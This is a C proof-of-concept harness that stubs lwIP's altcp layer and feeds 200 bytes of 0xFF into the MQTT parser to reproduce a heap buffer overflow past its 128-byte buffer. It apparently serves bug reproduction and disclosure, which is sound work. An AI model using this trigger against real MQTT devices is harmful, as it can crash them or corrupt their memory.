/* MQTT parser heap-buffer-overflow reproduction (mqtt.c:862). */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "lwip/opt.h"
#include "lwip/mem.h"
#include "lwip/pbuf.h"
#include "lwip/err.h"
#include "lwip/altcp.h"

/* altcp stubs (not exercised by the header parse path) */
void altcp_arg(struct altcp_pcb *conn, void *arg) { (void)conn;(void)arg; }
void altcp_recv(struct altcp_pcb *conn, altcp_recv_fn recv) { (void)conn;(void)recv; }
void altcp_sent(struct altcp_pcb *conn, altcp_sent_fn sent) { (void)conn;(void)sent; }
void altcp_poll(struct altcp_pcb *conn, altcp_poll_fn poll, u8_t interval) { (void)conn;(void)poll;(void)interval; }
void altcp_err(struct altcp_pcb *conn, altcp_err_fn err) { (void)conn;(void)err; }
void altcp_recved(struct altcp_pcb *conn, u16_t len) { (void)conn;(void)len; }
err_t altcp_connect(struct altcp_pcb *conn, const ip_addr_t *ipaddr, u16_t port, altcp_connected_fn connected) { (void)conn;(void)ipaddr;(void)port;(void)connected; return ERR_OK; }
err_t altcp_bind(struct altcp_pcb *conn, const ip_addr_t *ipaddr, u16_t port) { (void)conn;(void)ipaddr;(void)port; return ERR_OK; }
err_t altcp_close(struct altcp_pcb *conn) { (void)conn; return ERR_OK; }
void altcp_abort(struct altcp_pcb *conn) { (void)conn; }
err_t altcp_output(struct altcp_pcb *conn) { (void)conn; return ERR_OK; }
err_t altcp_write(struct altcp_pcb *conn, const void *dataptr, u16_t len, u8_t apiflags) { (void)conn;(void)dataptr;(void)len;(void)apiflags; return ERR_OK; }
u16_t altcp_sndbuf(struct altcp_pcb *conn) { (void)conn; return 0; }
struct altcp_pcb * altcp_tcp_new_ip_type(u8_t ip_type) { (void)ip_type; return NULL; }
struct altcp_pcb * altcp_tls_new(struct altcp_tls_config *config, u8_t ip_type) { (void)config;(void)ip_type; return NULL; }

#include "lwip/apps/mqtt_priv.h"
#include "../source/src/apps/mqtt/mqtt.c"

int main(void) {
    mqtt_client_t *client;
    struct pbuf *p;
    int i, payload_len = 200;   /* > rx_buffer[128] */
    u8_t *payload;

    printf("MQTT_VAR_HEADER_BUFFER_LEN = %d\n", MQTT_VAR_HEADER_BUFFER_LEN);
    client = (mqtt_client_t *)mem_malloc(sizeof(mqtt_client_t));
    memset(client, 0, sizeof(*client));

    p = pbuf_alloc(PBUF_RAW, (u16_t)payload_len, PBUF_RAM);
    payload = (u8_t *)p->payload;
    for (i = 0; i < payload_len; i++) payload[i] = 0xFF;

    printf("feeding %d continuation bytes to mqtt_parse_incoming...\n", payload_len);
    fflush(stdout);
    mqtt_parse_incoming(client, p);
    fprintf(stderr, "AFTER PARSE, msg_idx=%u\n", (unsigned)client->msg_idx);
    printf("msg_idx after parse = %u (buffer is %d)\n", (unsigned)client->msg_idx, MQTT_VAR_HEADER_BUFFER_LEN);
    pbuf_free(p);
    mem_free(client);
    return 0;
}
